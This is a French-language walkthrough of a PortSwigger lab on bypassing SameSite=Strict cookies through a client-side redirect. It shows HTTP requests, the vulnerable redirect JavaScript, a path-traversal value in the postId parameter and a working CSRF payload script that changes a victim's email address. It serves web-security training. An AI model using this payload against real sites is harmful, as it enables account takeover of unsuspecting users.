# Lab

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

## Solution

Dans ce lab quand on se connecte via POST `/login` on voit dans la réponse :

```html
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=aump8Q6QCZrfXrRycETORMd7mjUVr2MW; Secure; HttpOnly; SameSite=Strict
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Le cookie de session est sécurisé avec `SameSite=Strict` ce qui veut dire qu'il ne sera pas envoyé dans les requêtes cross-site.

On peut donc déjà savoir qu'il va falloir utiliser une opent redirect pour exploiter la vulnérabilité CSRF pour que la requête soit faite depuis le même domaine.

Quand on est sur la page de modification de l'adresse mail et qu'on lance le change, on voit dans la requête POST :

```html
POST /my-account/change-email HTTP/2
Host: 0ac80042048e53bb860b218000270017.web-security-academy.net
Cookie: session=aump8Q6QCZrfXrRycETORMd7mjUVr2MW
Content-Length: 42
Content-Type: application/x-www-form-urlencoded

email=attacker%40dontwannacry.com&submit=1
```

Si on essaye de changer le verbe HTTP en GET, on a une réponse 302 Found.

On peut donc essayer de faire une opent redirect en changeant le verbe HTTP en GET et en changeant l'adresse mail.

```html
GET /my-account/change-email?email=attafdcker%40dontwannacry.com&submit=1 HTTP/2
Host: 0ac80042048e53bb860b218000270017.web-security-academy.net
Cookie: session=aump8Q6QCZrfXrRycETORMd7mjUVr2MW
```

On a une réponse 302 Found avec une redirection vers `/my-account` et l'adresse mail a bien été changée.

Maintenant pour l'open redirect, on peut utiliser la fonctionnalité de redirection qui est vulnérable lors de post d'un commentaire :

```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

En injectant dans le query param `postId` une url avec un verbe HTTP GET, on peut faire une opent redirect.

```html
GET /post/comment/confirmation?postId=10/../../my-account/change-email?email=toto%40dontwannacry.com&submit=1 HTTP/2
Host: 0ac80042048e53bb860b218000270017.web-security-academy.net
Cookie: session=aump8Q6QCZrfXrRycETORMd7mjUVr2MW
```

On voit que ca fonctionne donc on peut générer un payload CSRF pour changer l'adresse mail d'un utilisateur :

```html
<script>
    document.location = 'https://0ac80042048e53bb860b218000270017.web-security-academy.net/post/comment/confirmation?postId=10/../../my-account/change-email?email=toto%40dontwannacry.com%26submit=1';
</script>
```

Ne pas oublier d'encoder le caractère `&` en `%26` sinon le paramètre `submit` ne sera pas passé dans la requête.